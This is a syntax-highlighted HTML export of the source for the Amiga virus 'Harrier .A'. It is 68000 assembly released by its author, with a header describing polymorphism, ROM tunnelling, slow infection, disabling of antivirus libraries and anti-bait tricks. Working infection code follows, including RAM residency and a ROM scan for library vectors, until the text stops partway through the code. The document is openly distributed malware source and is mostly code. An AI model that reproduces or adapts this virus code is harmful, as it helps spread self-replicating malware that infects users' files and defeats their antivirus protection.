<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;   [ Harrier .A virus coded by MaD roGEr/VRU!  2001 South Poland ]</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Harrier .A technical notes:</span><span class="sc0">
</span><span class="sc1">;   poly        +   uses external poly engine</span><span class="sc0">
</span><span class="sc1">;   tunnelling  +   uses advanced tunneling that fools</span><span class="sc0">
</span><span class="sc1">;               packet debugger used in SnoopDos</span><span class="sc0">
</span><span class="sc1">;   slow_infecting  +   file is only infected, if last infection was</span><span class="sc0">
</span><span class="sc1">;               at least 20 s. ago</span><span class="sc0">
</span><span class="sc1">;   retro       +   disables popular Amiga AV programs</span><span class="sc0">
</span><span class="sc1">;   anti-bait   +   uses some techniques to leave decoys</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus size: about 2k + poly engine + poly_decoder</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;System infection:</span><span class="sc0">
</span><span class="sc1">;-----------------</span><span class="sc0">
</span><span class="sc1">;   ROMCleanUpCode of every process installed in system (except ramlib)</span><span class="sc0">
</span><span class="sc1">;   VBlank routine to infect new processes</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;How it works:</span><span class="sc0">
</span><span class="sc1">;-------------</span><span class="sc0">
</span><span class="sc1">;First, virus allocates 15k of public memory and copies our code there. Next,</span><span class="sc0">
</span><span class="sc1">;starts tunelling routine that find in ROM adresses of 'dos.library' and</span><span class="sc0">
</span><span class="sc1">;'exec.library' functions used by the virus. If this is succesful - virus</span><span class="sc0">
</span><span class="sc1">;uses these adresses, if not - uses adresses from the base of libraries.</span><span class="sc0">
</span><span class="sc1">;When tracer was done, searches for 'ramlib' process (in tunelling way)</span><span class="sc0">
</span><span class="sc1">;and for 'dos.library' and 'xvs.library' bases, then installs interrupt</span><span class="sc0">
</span><span class="sc1">;on VBlank vector. This routine infects all processes in the system except</span><span class="sc0">
</span><span class="sc1">;'ramlib'. Processes are only infected, if the pointer to ROMCleanUpcode</span><span class="sc0">
</span><span class="sc1">;is equal to pointer at stack in the 'ramlib' process.</span><span class="sc0">
</span><span class="sc1">;When infected process ending, virus calls retro routine that disables in</span><span class="sc0">
</span><span class="sc1">;memory some AV programs ('xvs.library' is patched by VBlank routine).</span><span class="sc0">
</span><span class="sc1">;If time of last infection is at least 20 s. ago, virus gets locks from</span><span class="sc0">
</span><span class="sc1">;'ramlib', ThisTask and other processes installed in the system.</span><span class="sc0">
</span><span class="sc1">;If lock was found, scans dir for files to be infected. </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Virus is designed as slow poly and slow infecting. As first Amiga virus</span><span class="sc0">
</span><span class="sc1">;uses anti-bait technique.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Author's note:</span><span class="sc0">
</span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc1">;Finally I decided to release this virus as is. I have some ideas that may be</span><span class="sc0">
</span><span class="sc1">;used in the virus, but I don't have enough time to write all routines and</span><span class="sc0">
</span><span class="sc1">;test it. I'll try to improve some new ideas in next Harrier .B virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;[To the readers who good knows english: don't blame me for grammar and</span><span class="sc0">
</span><span class="sc1">;language mistakes in source (english mistakes ofcourse :), english is not my</span><span class="sc0">
</span><span class="sc1">;first language, i speak polish.]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Debug version $102</span><span class="sc0">

</span><span class="sc5">HUNK_CODE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">$3e9</span><span class="sc0">
</span><span class="sc5">HUNK_DATA</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">$3ea</span><span class="sc0">
</span><span class="sc5">HUNK_START</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">$3f3</span><span class="sc0">


</span><span class="sc1">;exec.library functions</span><span class="sc0">

</span><span class="sc5">Forbid</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">132</span><span class="sc0">
</span><span class="sc5">Permit</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">138</span><span class="sc0">
</span><span class="sc5">PutMsg</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">366</span><span class="sc0">
</span><span class="sc5">CacheClearU</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">636</span><span class="sc0">
</span><span class="sc5">AllocVec</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">684</span><span class="sc0">
</span><span class="sc5">FreeVec</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">690</span><span class="sc0">
</span><span class="sc5">ColdReboot</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">726</span><span class="sc0">


</span><span class="sc1">;execbase offsets</span><span class="sc0">

</span><span class="sc5">NT_LIBRARY</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">

</span><span class="sc5">DebugData</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">70</span><span class="sc0">
</span><span class="sc5">ThisTask</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">276</span><span class="sc0">
</span><span class="sc5">AttnFlags</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">296</span><span class="sc0">
</span><span class="sc5">ResModules</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">300</span><span class="sc0">
</span><span class="sc5">DeviceList</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">350</span><span class="sc0">
</span><span class="sc5">LibList</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">378</span><span class="sc0">
</span><span class="sc5">TaskReady</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">406</span><span class="sc0">
</span><span class="sc5">TaskWait</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">420</span><span class="sc0">


</span><span class="sc1">;process entries</span><span class="sc0">

</span><span class="sc5">tc_SPUpper</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">62</span><span class="sc0">
</span><span class="sc5">pr_CurrentDir</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">152</span><span class="sc0">
</span><span class="sc5">pr_HomeDir</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">188</span><span class="sc0">
</span><span class="sc5">pr_ExitData</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">196</span><span class="sc0">


</span><span class="sc1">;_dos_caller parameters</span><span class="sc0">

</span><span class="sc5">OPEN</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CLOSE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">READ</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">WRITE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SEEK</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">EXAMINE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">EXNEXT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">INFO</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">SETCOMMENT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">SETPROTECTION</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">SETFILEDATE</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">NAMEFROMLOCK</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">ADDPART</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">

</span><span class="sc1">;_exec_caller parameters</span><span class="sc0">

</span><span class="sc5">ADDINTSERVER</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FINDTASK</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;!! this is for debug only !!</span><span class="sc0">

</span><span class="sc1">;minimal_size   equ 700</span><span class="sc0">
</span><span class="sc1">;maximal_size   equ 2000</span><span class="sc0">

</span><span class="sc5">minimal_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20000</span><span class="sc0">
</span><span class="sc5">maximal_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">200000</span><span class="sc0">

</span><span class="sc1">;Debug routines</span><span class="sc0">
</span><span class="sc1">;   move.l  4.w,a6</span><span class="sc0">
</span><span class="sc1">;   bsr.w   _tracer</span><span class="sc0">
</span><span class="sc1">;   lea ramlib_name(pc),a1</span><span class="sc0">
</span><span class="sc1">;   moveq   #FINDTASK,d7</span><span class="sc0">
</span><span class="sc1">;   bsr.w   _exec_caller</span><span class="sc0">
</span><span class="sc1">;   move.l  d0,ramlib_task_ptr-ramlib_name(a1)</span><span class="sc0">
</span><span class="sc1">;   bsr.w   _infect_processes</span><span class="sc0">
</span><span class="sc1">;   rts</span><span class="sc0">

</span><span class="sc1">;   move.l  4.w,a6</span><span class="sc0">
</span><span class="sc1">;   bra.w   _retro</span><span class="sc0">

</span><span class="sc1">;   move.l  4.w,a6</span><span class="sc0">
</span><span class="sc1">;   bsr.w   _install_patches</span><span class="sc0">
</span><span class="sc1">;   rts</span><span class="sc0">
</span><span class="sc1">;   bra.w   _new_ExitCode</span><span class="sc0">


</span><span class="sc1">;This is a faked infected proggy</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">-</span><span class="sc5">a6</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">start_Harrier</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
    </span><span class="sc5">cnop</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">     
</span><span class="sc5">_start_virus</span><span class="sc0">
</span><span class="sc1">;   movem.l d0-a6,-(sp)     ;virus don't save regs, that was done</span><span class="sc0">
                    </span><span class="sc1">;by poly decoder</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">          </span><span class="sc1">;get execbase</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">60</span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">       </span><span class="sc1">;get virus_call instruction adres</span><span class="sc0">
    </span><span class="sc5">subq.l</span><span class="sc0">  #</span><span class="sc2">4</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">           </span><span class="sc1">;set PC 4 bytes back</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">orig_long</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;restore original long</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">    

</span><span class="sc5">start_Harrier</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">DebugData</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">    </span><span class="sc1">;get DebugData entry</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">_VRU</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">     </span><span class="sc1">;check virus activity</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_quit_virus</span><span class="sc0">     </span><span class="sc1">;installed</span><span class="sc0">
    </span><span class="sc5">btst</span><span class="sc0">    #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">AttnFlags</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;68020?</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_quit_virus</span><span class="sc0">     </span><span class="sc1">;if not 68020 =&gt; lame system found </span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc2">15360</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">;get 15k of mem</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">_AllocVec</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_quit_virus</span><span class="sc0">     
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_start_virus</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  #</span><span class="sc4">(</span><span class="sc5">_end_virus</span><span class="sc4">-</span><span class="sc5">_start_virus</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">

</span><span class="sc5">_copy_virus_to_RAM</span><span class="sc0">
    </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)+,(</span><span class="sc5">a1</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">_copy_virus_to_RAM</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">        </span><span class="sc1">;necessary..</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc5">_install_patches</span><span class="sc4">-</span><span class="sc5">_end_virus</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">_quit_virus</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">d0</span><span class="sc4">-</span><span class="sc5">a6</span><span class="sc0"> </span><span class="sc1">;all regs back </span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">         </span><span class="sc1">;return from virus</span><span class="sc0">

</span><span class="sc5">orig_long</span><span class="sc0">
    </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc5">$4e714e71</span><span class="sc0">

</span><span class="sc5">_VRU</span><span class="sc0">    </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc12">'VRU!'</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_AllocVec</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">swap</span><span class="sc0">    </span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc5">AllocVec</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">     
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_tracer</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">tracer_result</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a5</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">dos_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a3</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">NT_LIBRARY</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_find_rt_Init</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc4">(</span><span class="sc2">40</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">        </span><span class="sc1">;we need to find _LV0_MakeLibrary call</span><span class="sc0">
                    </span><span class="sc1">;in the ROM code.</span><span class="sc0">


</span><span class="sc1">;this is the code that we search it.</span><span class="sc0">
</span><span class="sc1">;(kick 3.1):</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; $41f900fa0c38     lea     $fa0c38,a0</span><span class="sc0">
</span><span class="sc1">; $93c9         suba.l  a1,a1</span><span class="sc0">
</span><span class="sc1">; $2449         move.l  a1,a2</span><span class="sc0">
</span><span class="sc1">; $4eaeffac     jsr _LV0_MakeLibrary(a6)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(kick 2.04):</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc1">; $41f900f91544     lea $f91544,a0</span><span class="sc0">
</span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;(kick 3.0):</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc1">; $41f900f971ec     lea $f971ec,a0</span><span class="sc0">
</span><span class="sc1">; ...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">_find_MakeLibrary_call</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$41f9</span><span class="sc4">,(</span><span class="sc5">a0</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_dostable_found</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">_find_MakeLibrary_call</span><span class="sc0">
    </span><span class="sc5">bra.b</span><span class="sc0">   </span><span class="sc5">_tracer_error</span><span class="sc0">

</span><span class="sc5">_dostable_found</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">         </span><span class="sc1">;adress of offset table in A1</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">dos_function_offsets</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_dos_vectors</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a4</span><span class="sc0">

</span><span class="sc5">_dos_loop</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">       
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)+,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">ext.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">add.l</span><span class="sc0">   </span><span class="sc5">a1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">btst</span><span class="sc0">    #</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">          </span><span class="sc1">;valid ROM adress?</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_tracer_error</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,(</span><span class="sc5">a4</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">tst.w</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_dos_loop</span><span class="sc0">

</span><span class="sc5">_find_exec_adresses</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">exec_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a3</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">NT_LIBRARY</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">_find_rt_Init</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_exec_functions_not_found</span><span class="sc0">
    
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">50</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">          </span><span class="sc1">;we need to find _LV0_MakeFunctions</span><span class="sc0">
                    </span><span class="sc1">;in first 100 bytes of code</span><span class="sc0">

</span><span class="sc1">;exec.library has a different method of initializing library base and vectors.</span><span class="sc0">
</span><span class="sc1">;Here we need to find _LV0_MakeFunctions call, register A1 contains adress</span><span class="sc0">
</span><span class="sc1">;of offset table, these offsets are 16-bit shifts (i don't know is that good)</span><span class="sc0">
</span><span class="sc1">;from start of offset table, ex.: we need to get original AllocVec() adress,</span><span class="sc0">
</span><span class="sc1">;we have pointer to rt_Init of our resident structure. Next step is locate</span><span class="sc0">
</span><span class="sc1">;16-bit offset to AllocVec() function in ROM, we have to get adress of the</span><span class="sc0">
</span><span class="sc1">;table from LEA instruction.</span><span class="sc0">
</span><span class="sc1">;We'll see:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;AllocVec   equ 684/3</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   lea a.(pc),a0</span><span class="sc0">
</span><span class="sc1">;   move.w  2(a0),d0</span><span class="sc0">
</span><span class="sc1">;   lea (a0,d0.w),a0    &lt;== adress of offset table</span><span class="sc0">
</span><span class="sc1">;   move.w  AllocVec(a0),d0</span><span class="sc0">
</span><span class="sc1">;   ext.l   d0</span><span class="sc0">
</span><span class="sc1">;   addq.l  #2,d0   </span><span class="sc0">
</span><span class="sc1">;   add.l   d0,a0       &lt;== ALL DONE!!! we have ORIGINAL adress!!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;a. $43fa1e5c   lea     $f8236c(pc),a1</span><span class="sc0">
</span><span class="sc1">;b. $2449       move.l  a1,a2</span><span class="sc0">
</span><span class="sc1">;c. $4eaeff6c   jsr     _LV0_MakeFunctions(a6)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">_find_MakeFunctions_call</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc5">$4eaeffa6</span><span class="sc4">,(</span><span class="sc5">a0</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_exectable_found</span><span class="sc0">
    </span><span class="sc5">subq.l</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">

    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">_find_MakeFunctions_call</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_exec_functions_not_found</span><span class="sc0">

</span><span class="sc5">_exectable_found</span><span class="sc0">    
    </span><span class="sc5">subq.l</span><span class="sc0">  #</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    
</span><span class="sc5">_find_exec_lea</span><span class="sc0">
    </span><span class="sc5">cmp.w</span><span class="sc0">   #</span><span class="sc5">$43fa</span><span class="sc4">,-(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_exec_lea_found</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">_find_exec_lea</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_exec_functions_not_found</span><span class="sc0">

</span><span class="sc5">_exec_lea_found</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">exec_function_offsets</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_exec_vectors</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a4</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">addq.w</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">

</span><span class="sc5">_exec_loop</span><span class="sc0">  
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)+,</span><span class="sc5">d0</span><span class="sc0">        </span><span class="sc1">;get PutMsg offset</span><span class="sc0">
    </span><span class="sc5">move.w</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d0.w</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">ext.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">  
